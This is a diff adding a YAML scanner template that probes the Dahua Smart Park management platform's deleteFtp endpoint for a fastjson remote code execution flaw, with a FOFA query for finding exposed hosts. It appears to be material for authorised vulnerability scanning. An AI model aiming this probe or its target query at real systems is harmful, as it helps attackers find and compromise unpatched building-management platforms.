@@ -1,0 +1,19 @@
+id: poc-yaml-dahua-zhyq-integrated-management-platform-deleteftp-rce
+info:
+  name: 大华智慧园区综合管理平台 deleteFtp 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 大华智慧园区综合管理平台
+  fofa: body="WPMS/asset/common/js/jsencrypt.min.js"
+requests:
+- method: POST
+  path: /CardSolution/card/accessControl/swingCardRecord/deleteFtp
+  headers:
+    Content-Type: application/json
+  data: '{"@type": "java.lang.AutoCloseable"'
+  expression: matches(body,`"errMsg":"syntax error, expect {, actual EOF, pos 0, fastjson-version
+    1\.2\.[123456]`)
+variables: {}
+transport: http
